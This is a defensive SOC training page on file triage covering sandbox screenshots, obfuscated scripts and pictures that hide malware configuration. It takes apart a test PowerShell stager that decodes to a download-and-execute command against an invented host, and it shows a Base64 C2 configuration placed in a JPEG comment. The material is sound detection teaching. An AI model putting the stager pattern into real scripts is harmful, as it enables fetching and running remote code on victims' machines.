---
title: "Visual Inspection, Malicious Scripts and Files That Help Malware — and the File Triage Summary"
tags:
  - training
  - blue-team
  - files
  - file-analysis
  - malware-triage
  - powershell
  - steganography
---

# Visual Inspection, Malicious Scripts and Files That Help Malware — and the File Triage Summary { #inspection-summary }

!!! abstract "What this page covers"
    The last tools of quick file triage, then a recap of the whole host part. **Visual inspection**: many malicious documents give themselves away the moment a human sees them, but you can't safely open them yourself, so we look at how to get a screenshot without infecting anything (a sandbox, a revertible VM, rendering on an OS that can't be exploited the same way) and at the big privacy question behind public sandboxes. **Malicious scripts**: the two easiest tells, a script that only downloads and runs more code and code that has been put through an obfuscator. We take a harmless obfuscated PowerShell test file apart line by line, decode it statically without running it, and see what the same script looks like in 4688 and 4104 events. **Files that help malware without being malware**: pictures used as hidden configuration or command-and-control (C2) messages, through steganography or simply through metadata. We hide a fake configuration in a test JPEG and find it again with `file`, `exiftool`, `strings` and a hex view, including a stray character that trips people up. Then the **five-question routine** for deciding quickly whether a file might be bad, a **recap of the host part** (endpoint attacks and defence, Windows and Linux logging, important events, the log pipeline and file analysis), and where to go if you want to become the team's reverse engineer. Practice questions with explanations at the end.

!!! note "Labels"
    **[Supplement]** = practical material you need to know, **[Correction]** = a commonly repeated claim that is wrong or outdated, **[Changed]**/**[Caution]** = what has changed recently and what is risky to do the old way. Hostnames, domains, accounts, IPs and file names are invented for illustration (`.example`, documentation and private IPs). The test script and the two test pictures were built on an analysis machine for this page, and every Linux output shown for them is real. The script only points at an invented `.example` domain and was never run. Sandbox reports and Windows event XML are illustrative: their layout matches the real thing, but the values are invented. No real malware, hashes or working exploit code appear on this page.

## The 8 key points { #key-points }

1. **Looking is often the fastest verdict.** A blurred "invoice" with a giant "Enable content" button is a lure, and you can tell in one second. The hard part isn't judging what you see, it's seeing it **without opening the file on a machine that matters**.
2. **Assume the document will infect whatever opens it.** You don't know whether it carries an exploit, a macro or just a link, so get the picture from a **sandbox screenshot** or a **snapshot VM you revert afterwards**.
3. **Public sandboxes publish what you give them.** A free submission is usually visible to everyone, including the attacker and anyone searching for your organisation's name. That's acceptable for commodity spam and not for a targeted attack or a document full of your own data. Look up the hash first, and use a private or on-premises sandbox for anything sensitive.
4. **Malicious scripts are often tiny.** A script whose only job is to **download and run something else**, especially from an odd domain, is a giveaway. Attackers keep the first stage small so there's little to detect and the real payload never sits in the attachment.
5. **Obfuscation is loud.** Random variable names, chopped-up strings, mixed case, long Base64 blobs and a "run this string" call at the end are meant to beat scanners, but to a human they announce "someone is hiding something". View scripts with `cat`, `less` or `strings` on a machine that won't run them, and decode statically.
6. **The host undoes obfuscation for you.** PowerShell script block logging (event **4104**) records each block as it's compiled, so the decoded command appears in the log. Pair it with **4688**/Sysmon 1 for who started it and Sysmon 3/22 for where it connected.
7. **Some "bad" files aren't malicious themselves.** A picture on a forum or social media post can carry **configuration or C2 instructions** for malware that's already running, hidden in the pixels (**steganography**) or simply in **metadata** such as the comment field. Code or Base64 in a picture's metadata has no innocent explanation worth assuming.
8. **The five-question routine**: is this a format known for exploits? Do the hash and signature settle it? Which features of this format get abused? Are those features in use (checked safely)? What do the artifacts you found (URLs, scripts, embedded files) tell you?

## Why this matters in a SOC { #why }

The earlier pages gave you precise tools: magic bytes, `strings`, `olevba`, `rtfobj`, `pdfid`, hashes and signatures. In a busy SOC you also need a **fast path**: the one or two checks that settle most cases in a minute, so you can spend your hour on the few that deserve it. For documents that fast path is often just *seeing* the lure. For scripts it's noticing that the code is either suspiciously small or deliberately unreadable. And for the cases where the file looks harmless (a meme, a holiday photo), you need to know that a harmless-looking file can still be part of an intrusion, so you don't stop investigating just because the attachment "is only a picture".

This page also closes the host part. The last section ties together what the host can tell you: how endpoints are attacked, how they're defended, how their logs are made and moved, and how to judge the files that show up on them.

## Investigation by visual inspection { #visual }

### Why looking works { #visual-why }

Phishing documents are written **for people**, not for scanners. To work, they have to persuade a human to do something: enable editing, enable content, click a button, scan a QR code, type a password. That persuasion layer is the part attackers can change least, because it has to make sense to the victim. And it's the part an analyst recognises fastest:

- a document that's "protected" or "blurred" until you **Enable Content**, often with a fake product logo and instructions in big arrows;
- an "invoice", "remittance" or "shipping notice" whose only content is a **View document** button or a link;
- a fake e-signature or shared-file page ("You have received 1 secure document");
- a **QR code** with an urgent instruction ("Scan to keep your mailbox active");
- a single line of text and a **package icon** labelled `update.exe` or `invoice.pdf` (an embedded object, as on the [RTF page](rtf-pdf-misc-triage.md)).

Think of it like airport security. The X-ray (your static tools) can tell you there's metal in the bag, but often a quick look at the label already tells you it's a parcel addressed to "Dear Customer" from a company that doesn't exist. The catch is that you're not allowed to open the parcel in the terminal.

### The problem: opening the file is the attack { #visual-risk }

You can't know in advance **which kind** of document you have:

- one that's harmless until the user clicks something (a link, a macro, an embedded object), or
- one that carries an **exploit** for the viewer itself (an Office, PDF reader or image library bug), which fires simply on open or even in a **preview pane**.

Since you can't tell which without analysing it first, the safe assumption is the worst one: **opening it on your workstation would infect your workstation**. So the job is to get a picture of the document from something you can afford to lose.

### Safe ways to see a suspect document { #visual-how }

| Method | How it works | Good for | Watch out for |
| --- | --- | --- | --- |
| **Sandbox with screenshots** | The sandbox opens the file in a monitored, throwaway VM and records screenshots, processes, files and network traffic | The fastest route, and you also get behaviour | Public services may publish the file. Some samples detect sandboxes and stay quiet |
| **Snapshot VM, revert after** | Your own analysis VM, isolated network, opened by hand, then reverted to the clean snapshot (see [safe handling](safe-handling-file-types.md#rule-vm)) | Private samples, interactive clicking through a lure | Discipline: never let the VM touch the production network, always revert |
| **Render on a different platform** | Convert to images on a Linux analysis box, e.g. `pdftoppm` for PDFs or a headless office suite for documents, inside a disposable container | A quick look at many documents without running Windows software | The renderer has bugs of its own, so treat the box as exposed. Macros and scripts don't run, so you only see the static page |
| **Text-only view** | `strings`, `olevba`, `pdf-parser` on the file | Reading a lure's words or a link without rendering | You lose layout, which is often the giveaway |

**[Supplement]** Sandbox options in practice. Open-source and self-hosted: **CAPE** (a maintained descendant of the original Cuckoo, strong on payload and configuration extraction) and **Cuckoo3** (a rewrite maintained by CERT-EE). The original Cuckoo Sandbox 2.x is no longer maintained, and malwr.com, once the best-known free Cuckoo service, has been gone for years. Online services include Hybrid Analysis, ANY.RUN (interactive: you can click through the lure yourself), Joe Sandbox and Triage, and most EDR and email-security products have a sandbox built in. Check which tier your organisation pays for, because that decides who can see your submissions.

### The big "if": who else sees your submission { #visual-privacy }

Free or community submissions are often **public**: anyone can search for the file, download it and read the report, including its screenshots. That has three consequences:

1. **Your data leaks.** A suspicious attachment might be a real contract, a CV or an internal spreadsheet that a user forwarded. Its screenshot is now on the internet.
2. **The attacker learns you found it.** Groups running targeted operations watch public services for their own samples. A submission with your organisation's name in the file is a clear signal.
3. **The link may be personalised.** Lures often embed the recipient's email address in the URL. When a public sandbox follows the link, the attacker's server learns that this address belongs to someone who investigates.

So the order is: **hash lookup first** (it reveals nothing about the content, see [hashing](hashing-signatures.md#hash-lookup)), then a **private** sandbox or your own VM, and a public submission only for clearly commodity samples and only if policy allows it.

### Reading a sandbox result { #visual-report }

An illustrative (invented) summary for an attachment called `Remittance_0412.docx`:

```text
File          Remittance_0412.docx   (Microsoft Word 2007+)
SHA-256       9a41c6...e07b  (not seen before this submission)
Verdict       Malicious (score 88/100)
Screenshot 1  Word: yellow bar "PROTECTED VIEW ... Enable Editing"
Screenshot 2  Page image: blurred invoice, banner "This document is protected.
              Click ENABLE CONTENT to view"
Processes     WINWORD.EXE (2840)
              └─ (no child processes; macros did not run in Protected View)
Network       none
Static        olevba: VBA macros: Yes, AutoExec: Document_Open
              URL in document.xml.rels: https://docs-portal.example/view?u=c.kim@corp.example
Signatures    Office document with auto-executing macro; lure image asks to enable content
```

- `Microsoft Word 2007+` — the type the sandbox detected from the bytes (an OOXML ZIP), not from the extension.
- `not seen before this submission` — a brand-new hash, so no reputation either way, and this submission may be the first public trace of it.
- `Screenshot 1` and `2` — the lure. Opened in Protected View, Word shows the yellow bar. The page itself is an **image** of a blurred invoice with instructions. A real invoice doesn't need you to enable content, so this alone is enough to call it malicious.
- `Processes` — **no child process**. That's not a sign of innocence: the macro didn't run because nobody clicked Enable Content. Many sandboxes can be configured to click automatically. Treat a quiet process tree on a document as "didn't trigger", not "harmless".
- `olevba ... AutoExec: Document_Open` — a static check confirms a macro that runs when the document opens (see [`olevba`](safe-handling-file-types.md#olevba)).
- `URL ... u=c.kim@corp.example` — a link with the **recipient's address built in**. Don't visit it from a corporate IP, and note it as an IOC (domain `docs-portal.example`).
- Verdict for the SOC: malicious lure. Block the domain and the hash, find other recipients of the same email, and check whether anyone enabled content (a `WINWORD.EXE` child process in 4688 or Sysmon 1 on any host).

## Detecting malicious scripts { #scripts }

### Two easy tells { #scripts-tells }

Scripts (`.js`, `.vbs`, `.ps1`, `.hta`, `.bat`, `.cmd`) are text, so unlike executables you can **read** them, provided you read them on a machine that won't execute them. Two patterns catch most malicious ones:

**1. It's tiny, and all it does is fetch and run more code.** Many first-stage scripts contain nothing but "download this from a URL, then run it". From the attacker's point of view, that's clever:

- there's almost nothing for a scanner to recognise, since downloading is something legitimate scripts do too;
- the real malware (the second stage) never travels in the email, so if the attachment is caught, defenders don't get the payload and antivirus signatures for it take longer to appear;
- the attacker can swap the payload on the server at any time, or serve it only to targets that look real (right country, not a sandbox).

So a script that only downloads and runs, especially from an odd, new or look-alike domain, is a strong signal by itself. In ATT&CK terms that's **T1105 Ingress Tool Transfer** driven by a command interpreter (**T1059.001 PowerShell**, **T1059.005 Visual Basic**, **T1059.007 JavaScript**).

**2. It's been through an obfuscator.** Malicious scripts are usually passed through a tool that renames everything to nonsense, splits strings into pieces, mixes upper and lower case, encodes chunks in Base64 or character codes, and builds the real command at runtime (**T1027.010 Command Obfuscation**). The goal is to beat automated scanners and email filters that match on keywords like `DownloadString` or `WScript.Shell`. The irony is that this makes a human's job **easier**: normal administrators don't write code that looks like a ransom note made from magazine cut-outs.

### Viewing a script safely { #scripts-view }

Rules:

- **Never double-click.** On Windows, double-clicking `.js`, `.vbs`, `.hta` and (depending on settings) `.ps1` runs them.
- **Read on an OS that can't run it**, or at least with a tool that only displays text: `cat`, `less`, `strings`, a text editor with syntax highlighting. On a Linux analysis box, even a Windows script can't do much.
- **Don't trust `file` to tell you what it is.** Scripts are plain text, so `file` often just says `ASCII text`. You have to read it.

### Worked example: an obfuscated PowerShell stager { #scripts-example }

A harmless test file built for this page (it only references an invented `.example` domain and was never run):

```text
$ file invoice_0412.ps1
invoice_0412.ps1: ASCII text
$ wc -c invoice_0412.ps1
402 invoice_0412.ps1
$ cat invoice_0412.ps1
$qZx7 = 'Sy'+'stEm.'+'TeXt.'+'EnCo'+'DiNg'
$Lp0w = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBi"
$Lp0w += "AEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBjAGQAbgAtAHMAeQBuAGMALgBlAHgAYQBtAHAAbABlAC8AcwAyACcAKQA="
$vR = [TyPe]($qZx7)
$kD9 = $vR::Unicode.GetString([Convert]::('FromB'+'ase64String').Invoke($Lp0w))
& ([ScriptBlock]::Create($kD9))
```

First, the two quick facts. `file` says only `ASCII text`: no hint that this is PowerShell, let alone malicious. And the whole thing is **402 bytes**: an "invoice" with no invoice in it. Now line by line:

- `$qZx7 = 'Sy'+'stEm.'+'TeXt.'+'EnCo'+'DiNg'` — a variable with a meaningless name gets a string glued together from five pieces in random case. Joined, it's `System.Text.Encoding`, the .NET class that converts bytes to text. PowerShell type names aren't case-sensitive, so the odd case still works, but a scanner looking for the exact text `System.Text.Encoding` misses it. Splitting a harmless class name is pure **scanner evasion**.
- `$Lp0w = "SQBFAFgA..."` and `$Lp0w += "AEMAbABp..."` — a long Base64 string, split across two lines and joined with `+=`. The split means no single line contains the whole encoded command. The repeated `A` every other character (`SQBFAFgAIAAo...`) is the fingerprint of **UTF-16LE text** encoded in Base64: each ASCII letter becomes the letter plus a zero byte, and zero bytes show up as `A` in Base64 (see [Base64](../http-analysis/base64.md) and [encodings](file-identification.md#unicode)).
- `$vR = [TyPe]($qZx7)` — turns the string `System.Text.Encoding` into the actual type, so the script can use the class without ever writing its name in one piece.
- `$kD9 = $vR::Unicode.GetString([Convert]::('FromB'+'ase64String').Invoke($Lp0w))` — the decoding step. `[Convert]::FromBase64String` turns Base64 into bytes, but the method name is split again (`'FromB'+'ase64String'`) and called through `.Invoke(...)` so the keyword `FromBase64String` never appears. `Unicode.GetString` then reads the bytes as UTF-16LE text. The result, the real command, sits in `$kD9`.
- `& ([ScriptBlock]::Create($kD9))` — compile the decoded string as code and run it (`&` is the call operator). This last line is the "**run the string I just built**" pattern, the most reliable sign of a stager. Its cousins are `Invoke-Expression`/`IEX`, `.Invoke()`, `eval(` in JavaScript and `Execute`/`ExecuteGlobal` in VBScript.

Decode it **statically**, on the analysis machine, without running PowerShell at all:

```text
$ grep -oE '"[A-Za-z0-9+/=]+"' invoice_0412.ps1 | tr -d '"\n' | base64 -d | iconv -f UTF-16LE
IEX (New-Object Net.WebClient).DownloadString('https://cdn-sync.example/s2')
```

- `grep -oE '"[A-Za-z0-9+/=]+"'` — print only the double-quoted runs of Base64 characters (the two pieces of `$Lp0w`). `-o` prints just the match, `-E` enables the extended pattern.
- `tr -d '"\n'` — delete the quotes and the newline between the pieces, which glues them back into one string, exactly as `+=` did.
- `base64 -d` — decode Base64 into bytes.
- `iconv -f UTF-16LE` — interpret those bytes as UTF-16LE and print them as normal text. Without this step you'd see the letters with invisible zero bytes between them.
- The output is the whole point of the script: download text from `https://cdn-sync.example/s2` and run it with `IEX` (`Invoke-Expression`). A 402-byte "invoice" whose only job is to download and execute code from a domain nobody has heard of: tell number one and tell number two in the same file.

**[Supplement]** CyberChef ("From Base64" then "Decode text: UTF-16LE") does the same in a browser, which is handy on a Windows analysis box. For heavily layered samples, repeat: decode a layer, read it, decode the next. Never "decode" by replacing the final `&`/`IEX` with `Write-Output` and running it on a machine you care about: one missed layer and you've run the payload.

### Other quick checks for scripts { #scripts-checks }

- **Signed?** PowerShell, VBScript and JScript files can carry an Authenticode signature as a comment block at the end (`# SIG # Begin signature block` in `.ps1`). An internal admin script signed by your own code-signing certificate is a good sign. A signed script from a stranger is just a signed script (see [does signed mean safe](hashing-signatures.md#signed-safe)).
- **Hash lookup.** Commodity scripts are often already known. Remember that obfuscators can produce a fresh variant for every email, so "unknown" is normal for scripts.
- **Reputation of what it calls.** The domain or IP in the decoded command is often the best IOC: newly registered, look-alike or free hosting (see [URL reputation](../http-analysis/evil-http-and-reputation.md)).
- **Where did it come from?** A `.js` inside a ZIP from an email, opened by `wscript.exe` from `%TEMP%\Temp1_*.zip`, has no business case in most organisations (see [scripts and interpreters](safe-handling-file-types.md#scripts)).

**[Caution]** Obfuscation isn't proof of malice. Commercial web code is minified and sometimes obfuscated to protect it, licensing tools hide their logic, and some management agents ship Base64-encoded PowerShell. Judge what the decoded code **does** and where the file came from, not just how ugly it looks.

### The same script in the logs { #scripts-logs }

If a user ran this file, the host would record it at several layers. An illustrative 4688 (process creation, see [process creation](../important-events/process-creation.md)):

```text
EventID          4688
NewProcessName   C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
CommandLine      "powershell.exe" -ExecutionPolicy Bypass -File "C:\Users\c.kim\Downloads\invoice_0412.ps1"
ParentProcessName C:\Windows\explorer.exe
SubjectUserName  c.kim
```

- **4688** fires whenever a new process starts (with command-line auditing turned on, it includes the full command line). Attackers care because every tool they launch leaves one, which is why they prefer living inside existing processes.
- `-ExecutionPolicy Bypass -File ...\Downloads\invoice_0412.ps1` — the execution policy is a safety belt, not a security boundary, and anyone can bypass it per process. An "invoice" run as a script from Downloads is the alert.
- `ParentProcessName explorer.exe` — the user started it (double-click or right-click > Run with PowerShell): **T1204.002 User Execution: Malicious File**.

Then **4104** in `Microsoft-Windows-PowerShell/Operational` (script block logging, explained field by field in [PowerShell logs](../important-events/accounts-defender-powershell.md#4104)). Because the script compiles a **new** script block from the decoded string, you'd get two blocks: first the file as written, with `Path` set to the `.ps1`, and then this one:

```xml
<EventID>4104</EventID>
<Level>3</Level>
<Data Name="MessageNumber">1</Data>
<Data Name="MessageTotal">1</Data>
<Data Name="ScriptBlockText">IEX (New-Object Net.WebClient).DownloadString('https://cdn-sync.example/s2')</Data>
<Data Name="ScriptBlockId">4e7d0c2a-93b1-4f6e-a8d2-71c5e0b39f14</Data>
<Data Name="Path"></Data>
```

- `ScriptBlockText` — the decoded command, in plain text. You didn't have to decode anything: PowerShell had to turn the string into code to run it, and that's exactly the moment 4104 records. Then `s2` itself would arrive as yet more 4104 blocks, even though it never touched the disk.
- `Level 3` (Warning) — PowerShell flags blocks containing suspicious terms such as `DownloadString` and logs them **even when script block logging hasn't been turned on**, which is a free safety net. Don't rely on it: turn full logging on.
- `Path` empty — this block came from a string built at runtime, not from a file.

Network evidence completes the picture: a Sysmon 22 (DNS query) for `cdn-sync.example` and a Sysmon 3 (network connection) from `powershell.exe` to its address, plus proxy logs for the download. And if Defender's AMSI (Antimalware Scan Interface) scanned the decoded block and recognised it, you'd see a Defender detection event (1116) naming `powershell.exe` as the process, see [Defender events](../important-events/accounts-defender-powershell.md#1116).

## Files that contribute to malicious behaviour { #supporting }

### Bad, but not evil by itself { #supporting-what }

Not every file involved in an intrusion is malware. Some files are just **messages for malware that's already running**. Pictures are a favourite carrier for configuration data and C2 instructions. It works like this:

1. The attacker writes the malware with a built-in **location to check**: a forum thread, a social media account, an image-hosting page, a public code repository. Then they infect the victim with it.
2. The running malware **periodically downloads** whatever picture is posted there. To the network, this is an ordinary HTTPS request to a popular website, so it's very hard to tell apart from normal browsing.
3. The malware, which already contains the decoding logic, **extracts the hidden message** from the picture: a new C2 address, a command, a configuration change.

The key point is that the picture **does nothing on its own**. Opened in an image viewer, it's just a picture. It only "works" for the malware that's already on the machine. Think of a spy who checks a particular noticeboard every morning: the notice reads like an ordinary flyer to everyone else, but the spy knows that a red pin in the corner means "meet tonight". In ATT&CK this is **T1102 Web Service**, specifically **T1102.001 Dead Drop Resolver** when the post only tells the malware where the real C2 server is, and **T1001.002 Data Obfuscation: Steganography** for the hiding.

A well-known public example is from 2018: malware that read memes posted to a social media account and decoded commands from them. Another was a picture on a public image-hosting service with Base64-encoded instructions in its metadata comment.

### Two ways to hide data in a picture { #supporting-how }

- **Steganography**: hiding the message **in the image data itself**, typically by changing the least significant bit of pixel values (a change of 1 in a colour value of 200 is invisible to the eye). The picture looks identical, the file size barely changes, and you can't find the message with `strings`. This is genuinely hard to detect and, judging by how often it turns up in public reports, more common than we notice. In 2025, loaders hid their next stage in PNG pixels in several campaigns, including ones that used fake update and CAPTCHA pages. The steganography technique for hiding payloads in files is **T1027.003**.
- **Metadata**: simply putting the message in a field that pictures already have: the JPEG comment, EXIF fields such as camera make, artist or description, or PNG text chunks. Normally these fields hold the camera model or GPS position. Here they hold an encoded URL, IP address or a whole script. This is like writing a note on the back of a photo: anyone who turns it over can read it, which is exactly why it's easy for us to find.

### Worked example: a config hidden in a JPEG comment { #supporting-example }

Two harmless test pictures built for this page: `holiday.jpg` (normal camera metadata) and `meme_0412.jpg` (the same image with a hidden "configuration" in the comment field). Both look like a white circle on blue when opened.

```text
$ file meme_0412.jpg
meme_0412.jpg: JPEG image data, JFIF standard 1.01, aspect ratio, density 0x0, segment length 16, Exif Standard: [TIFF image data, big-endian, direntries=6, manufacturer=Canon, xresolution=92, yresolution=100, resolutionunit=1], comment: "eyJjMiI6Imh0dHBzOi8vY2RuLXN5bmMuZXhhbXBsZS9hcGkiLCJzbGVlcCI6MzYwMCwiaWQiOiJieDE3In0=", baseline, precision 8, 64x64, components 3
```

- `JPEG image data, JFIF standard 1.01` — a genuine JPEG. Nothing here is a disguised executable, so a check that only asks "is it really a picture?" passes.
- `Exif Standard: [... manufacturer=Canon ...]` — an EXIF block with a camera make, as in any phone or camera photo.
- `comment: "eyJjMiI6..."` — `file` prints the JPEG comment, and it's a long Base64 string. Real cameras don't write comments like this. `eyJ` at the start is worth memorising: it's what `{"` looks like in Base64, so **`eyJ` almost always means Base64-encoded JSON** (you also see it at the start of every JSON Web Token).
- `64x64, components 3` — a tiny 64×64 colour image. A real meme or photo would be much larger, so a tiny picture carrying a long comment is odd in itself.

`exiftool` shows the metadata as named fields, here for both files side by side:

```text
$ exiftool -Comment -Artist -Make -Model -FileType -MIMEType meme_0412.jpg holiday.jpg
======== meme_0412.jpg
Comment                         : eyJjMiI6Imh0dHBzOi8vY2RuLXN5bmMuZXhhbXBsZS9hcGkiLCJzbGVlcCI6MzYwMCwiaWQiOiJieDE3In0=
Artist                          : admin
Make                            : Canon
File Type                       : JPEG
MIME Type                       : image/jpeg
======== holiday.jpg
Make                            : Canon
Camera Model Name               : EOS 250D
File Type                       : JPEG
MIME Type                       : image/jpeg
    2 image files read
```

- `exiftool -Comment -Artist ...` — ask for just these tags. Without the list, `exiftool` prints every tag it finds (dozens on a real photo), which is useful when you don't know where to look.
- `meme_0412.jpg`: a `Comment` full of Base64, an `Artist` of `admin`, a `Make` but **no** `Camera Model Name`. A real camera writes both make and model (and usually exposure, date and lens fields), so a make without the rest suggests the metadata was written by a tool, not a camera.
- `holiday.jpg`: make and model, no comment. That's what normal looks like.
- `File Type JPEG` / `MIME Type image/jpeg` for both: by type, both are perfectly normal pictures, which is the point. The evidence is in the fields, not the format.

Without `exiftool` (on a locked-down box, for example), `strings` finds it too:

```text
$ strings -t x -n 8 meme_0412.jpg
     93 VeyJjMiI6Imh0dHBzOi8vY2RuLXN5bmMuZXhhbXBsZS9hcGkiLCJzbGVlcCI6MzYwMCwiaWQiOiJieDE3In0=
```

- `-t x` prints the offset in hex (`0x93`), `-n 8` hides runs shorter than 8 characters, which removes most of the noise from the compressed image data.
- The only long string in the file is the Base64 blob. In a normal photo, `strings` shows the camera make and model, a date and perhaps editing software. Anything that looks like **code, a URL or Base64** is the finding.
- Notice the **`V` in front of `eyJ`**. It's not part of the message. Here's why, in a hex view of the same spot:

```text
0000008c  6d 69 6e 00 ff fe 00 56  65 79 4a 6a 4d 69 49 36  |min....VeyJjMiI6|
0000009c  49 6d 68 30 64 48 42 7a  4f 69 38 76 59 32 52 75  |Imh0dHBzOi8vY2Ru|
```

- `6d 69 6e 00` — `min` and a zero byte: the end of the `admin` artist string in the EXIF block.
- `ff fe` — the JPEG **COM** (comment) marker. JPEG files are made of segments that start with `FF` and a type byte: `FF D8` starts the image, `FF E1` is EXIF, `FF FE` is a comment.
- `00 56` — the segment **length**, 0x56 = 86 bytes: 2 bytes for the length itself plus the 84 characters of the comment. Byte `56` happens to be the printable letter `V`, so `strings` glued it onto the front. When you copy a string out of `strings` output, check its edges: a stray length or type byte at the start is common.
- `65 79 4a 6a ...` — `eyJj...`, the comment itself.

Decoding it (only the part starting at `eyJ`):

```text
$ strings -n 8 meme_0412.jpg | grep -o 'eyJ[A-Za-z0-9+/=]*' | base64 -d
{"c2":"https://cdn-sync.example/api","sleep":3600,"id":"bx17"}
```

- `grep -o 'eyJ[A-Za-z0-9+/=]*'` — start the match at `eyJ` (which drops the stray `V`) and continue through Base64 characters. If you decode with the `V` included, `base64` produces garbage, because every character is now in the wrong position of its 4-character group.
- The decoded JSON is a malware configuration: a C2 URL (`https://cdn-sync.example/api`), a check-in interval of 3,600 seconds (once an hour) and a campaign or bot ID `bx17`. There's no legitimate reason for a meme to contain this. The IOCs to record are the domain, the URL path, and the picture's hash and source page.

### How to catch this kind of thing { #supporting-detect }

- **On files**: run `exiftool` or `strings` over pictures that turn up in an investigation (especially ones that a suspicious process downloaded) and look for code, URLs or Base64 in metadata. A Base64 blob or script keywords (`eval`, `powershell`, `<script>`) in an image is an immediate red flag. For steganography, tools exist that check common pixel-hiding methods, and entropy or size anomalies can hint at extra data, but expect to miss well-made samples.
- **Look for data after the end.** Some loaders simply **append** a payload after the image's end marker (`FF D9` for JPEG, `IEND` for PNG). The picture still displays normally. Signature scanning and carving (see [nested files](file-identification.md#nested-files)) find these.
- **On the host, catch the reader, not the picture.** The image is an ordinary download from a popular site, but **who** downloads it is not ordinary. A browser fetching images from a social media site is normal. `rundll32.exe`, `regsvr32.exe`, a script host or an unsigned binary in `%APPDATA%` fetching images from the same site every hour is not. Sysmon 22 (DNS) and Sysmon 3 (connection) carry the `Image` field that names the process: that's where this pattern shows up.
- **Look at timing.** Regular check-ins (every 3,600 seconds here) to the same page by the same process is a beacon, even when the destination is a reputable site.

## Summary: identifying and handling suspicious files { #routine }

To decide quickly whether a file might be bad, ask five questions in order. Each one is cheaper than the next, and you stop as soon as the answer is clear.

1. **Is this a format known for carrying exploits or code?** Executables and DLLs, scripts, Office documents (macros, embedded objects, remote templates), RTF, PDF, shortcuts, disk images and archives that contain any of these. A plain `.txt` or `.csv` is much less likely to be the attack itself (though it can still carry a link or instructions).
2. **Can the hash or signature settle it?** A hash lookup hit on known malware ends the triage and starts the scoping. A valid signature from the expected publisher, with a file seen for years, is reassuring. Neither "unknown" nor "signed" ends the investigation on its own (see [hashing and signatures](hashing-signatures.md)).
3. **What features of this format get abused?** Links, embedded files and objects, auto-run actions (`Document_Open`, `/OpenAction`, `\objupdate`), scripts and macros, remote templates, and metadata. Knowing the format tells you where to look.
4. **Are those features in use?** Check **safely and quickly**: a sandbox, manual static analysis (`olevba`, `rtfobj`, `pdfid`, `strings`, `exiftool`) or dynamic analysis on an OS that's isolated and revertible, or just a look at a screenshot.
5. **What do the artifacts say?** Check every artifact you found: URL and domain reputation, decode obfuscated scripts, extract and repeat the routine on every embedded file.

The format-to-feature map behind steps 1 and 3:

| Format | Features that get abused | First tool |
| --- | --- | --- |
| PE (`.exe`, `.dll`, `.scr`, `.cpl`) | It *is* code: everything | hash, `sigcheck`, `strings`, sandbox |
| Scripts (`.js`, `.vbs`, `.ps1`, `.hta`, `.bat`) | Download-and-run, obfuscation | `cat`/`less`, static decode, 4104 |
| Office (`.doc[m]`, `.xls[m]`, `.docx`) | Macros, embedded objects, links, remote templates, exploits | `oleid`, `olevba`, `unzip -l`, sandbox |
| RTF (often renamed `.doc`) | OLE objects, remote templates, exploits | `rtfobj`, `strings` for hex `4d5a` |
| PDF | Links, QR codes, embedded files, JavaScript, auto actions | `pdfid`, `pdf-parser`, `strings` |
| Shortcuts (`.lnk`) | A command line that runs an interpreter | an LNK parser, `strings -e l` |
| Pictures | Exploits for parsers (rare), appended payloads, hidden config in metadata or pixels | `file`, `exiftool`, `strings`, carving |
| Archives and disk images (`.zip`, `.iso`, `.img`) | Containers for the above, sometimes used to dodge Mark of the Web | `7z l`, then repeat for each file |

The same five questions applied to this page's three test files:

| Question | `Remittance_0412.docx` | `invoice_0412.ps1` | `meme_0412.jpg` |
| --- | --- | --- | --- |
| 1 Risky format? | Yes (OOXML, macros possible) | Yes (script) | Not normally |
| 2 Hash / signature | New hash, unsigned | New hash, no signature block | New hash, not applicable |
| 3 Abusable features | Macros, links | Download, `IEX`, `ScriptBlock::Create` | Metadata, pixels, appended data |
| 4 In use? | Auto-run macro and a lure image | Base64 + "run the string" pattern | Base64 in the JPEG comment |
| 5 Artifacts | `docs-portal.example` with recipient address | `https://cdn-sync.example/s2` | C2 `https://cdn-sync.example/api`, ID `bx17` |
| Verdict | Malicious lure | Malicious stager | Not malware, but **malware configuration**: look for the infected host that reads it |

This only scratches the surface of malware analysis, but these checks are enough to call most files suspect or not in minutes. Going further, taking malware apart to understand its full capabilities and communications, is the field of **reverse engineering**: disassembly and debugging of programs, and deeper analysis of malicious documents and scripts. The classic starting book is *Practical Malware Analysis* (No Starch Press, 2012). Its labs show their age (Windows XP, 32-bit), but its method from strings to debugging still holds. Today you'd pair it with free tools such as Ghidra, x64dbg, and the REMnux (Linux) and FLARE-VM (Windows) analysis distributions. Every SOC eventually needs someone who can do this, and it's a rewarding career path.

## Recap: what the host part covered { #recap }

The host part looked at the endpoint from several sides. Here is the thread that runs through it.

- **[Endpoint attacks](../endpoint-attacks/index.md)**: attackers concentrate on what happens **after** initial exploitation, the post-exploitation tactics in MITRE ATT&CK: execution, persistence, discovery, privilege escalation, credential access, lateral movement, collection and exfiltration. Knowing those stages is what lets you plan detections for each of them, instead of only at the front door.
- **[Endpoint defence](../endpoint-defense/index.md)**: defence in depth on the host, matched to those stages: inventory, vulnerability scanning and patching, exploit protection, Credential Guard, firewalls and antivirus, application control, FIM, PAWs and privilege management, EDR, DLP, UEBA and audit policy. The aim is to disrupt, prevent and detect at **every** stage, not just one.
- **[Windows logging](../windows-logging/index.md)** and **[Linux logging](../linux-logging/index.md)**: how events are actually produced: providers, channels and `.evtx` on Windows, syslog, `/var/log`, the journal and auditd on Linux. You will look at logs more than anything else in a SOC, so knowing how they're made is not optional.
- **[Important events](../important-events/index.md)**: the event IDs that carry most investigations: logons, process creation, firewall and object access, services, scheduled tasks and USB, accounts, Defender and PowerShell, and Kerberos with its TGT and service ticket events.
- **[Log pipeline & SIEM](../log-pipeline/index.md)**: what happens between the host and your search bar: collection, formats and structure, enrichment, normalisation, categorisation, storage and the log life cycle. Searching the SIEM is step one. Understanding how each event was created, moved and changed is what lets you ask **better questions** of your data and notice when the pipeline, not the attacker, explains a gap.
- **[File analysis](index.md)**: what a file really is without trusting its name, how to pull clues out of it, how to handle it safely, which types attackers prefer, what hashes and signatures can and can't tell you, and the quick checks on this page.

The common lesson: the endpoint is where attacks actually happen, and nearly everything about it can be logged, if you know which events matter, make sure they're collected and understand what the pipeline did to them on the way.

## The 2026 view { #trends }

